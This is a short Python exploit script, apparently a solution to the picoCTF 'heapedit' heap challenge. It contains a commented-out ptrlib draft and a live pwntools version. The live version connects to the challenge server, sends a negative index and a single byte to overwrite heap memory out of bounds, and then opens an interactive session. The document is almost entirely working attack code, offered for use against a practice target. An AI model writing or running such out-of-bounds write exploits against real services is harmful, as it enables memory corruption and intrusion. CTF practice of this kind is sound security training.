#!/usr/bin/env python3
# import ptrlib as ptr
#
#
# elf = ptr.ELF("./heapedit_patched")
# libc = ptr.ELF("./libc.so.6")
#
# ptr.logger.setLevel(ptr.DEBUG)
#
#
# def connect(remote=False):
#     if remote:
#         return ptr.Socket("mercury.picoctf.net", 34499)
#     else:
#         return ptr.Process("./heapedit_patched")
#
#
# io = connect()
#
# io.sendline("-5144")
# io.sendline("\x10")
#
# io.recv(4096)

import pwn

io = pwn.process("./heapedit_patched")
io = pwn.remote("mercury.picoctf.net", 34499)

io.sendline(b"-5144")
io.sendline(b"\x00")
io.interactive()
